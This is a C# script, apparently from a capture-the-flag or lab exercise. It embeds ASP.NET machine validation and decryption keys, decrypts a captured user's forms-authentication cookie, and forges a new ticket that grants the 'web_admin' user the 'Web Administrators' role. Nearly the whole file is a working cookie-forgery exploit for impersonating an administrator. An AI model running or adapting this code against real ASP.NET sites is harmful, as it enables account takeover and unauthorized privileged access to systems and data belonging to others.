using System;
using System.IO;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static byte[] HexToBytes(string hex)
    {
        var bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    static void Main(string[] args)
    {
        string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
        string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        var enc = new LegacyFormsAuthenticationTicketEncryptor(
            HexToBytes(decryptionKey), HexToBytes(validationKey), ShaVersion.Sha256);

        // 1. decrypt the real ken.w cookie to learn the ticket layout
        string cookie = File.ReadAllText("/home/kali/hercules/ken.cookie").Trim();
        try
        {
            var t = enc.DecryptCookie(cookie);
            Console.WriteLine("=== decrypted ken.w ticket ===");
            Console.WriteLine("Name        : " + t.Name);
            Console.WriteLine("UserData    : " + t.UserData);
            Console.WriteLine("CookiePath  : " + t.CookiePath);
            Console.WriteLine("IsPersistent: " + t.IsPersistent);
            Console.WriteLine("Version     : " + t.Version);
        }
        catch (Exception e)
        {
            Console.WriteLine("decrypt failed: " + e.Message);
        }

        // 2. forge a ticket for web_admin (UserData = Web Administrators)
        string targetUser = args.Length > 0 ? args[0] : "web_admin";
        string userData = args.Length > 1 ? args[1] : "Web Administrators";

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(10);
        var forged = new FormsAuthenticationTicket(1, targetUser, issueDate, expiryDate,
                                                   false, userData, "/");
        string outCookie = enc.Encrypt(forged);
        Console.WriteLine("\n=== forged cookie for " + targetUser + " (" + userData + ") ===");
        Console.WriteLine(outCookie);
        File.WriteAllText("/home/kali/hercules/forged.cookie", outCookie);
    }
}
